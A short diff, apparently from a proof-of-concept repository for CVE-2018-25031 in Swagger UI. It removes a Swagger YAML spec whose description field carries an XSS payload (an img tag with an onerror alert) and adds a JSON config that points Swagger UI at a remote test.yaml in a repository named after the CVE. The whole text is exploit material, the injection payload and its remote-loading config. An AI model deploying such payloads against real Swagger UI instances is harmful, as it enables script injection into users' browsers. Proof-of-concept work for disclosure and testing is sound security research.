@@ -1,11 +1,9 @@
-swagger: '2.0'
-info:
-  version: "0.0.1"
-  title: Example Title
-  description: <img src=x onerror="alert('XSS')">
-paths:
-  /:
-    get:
-      responses:
-        200:
-          description: Successful response
+{
+    "url": "https://raw.githubusercontent.com/mathis2001/CVE-2018-25031/main/test.yaml",
+    "urls": [
+        {
+            "url": "https://raw.githubusercontent.com/mathis2001/CVE-2018-25031/main/test.yaml",
+            "name": "Foo"
+        }
+    ]
+}
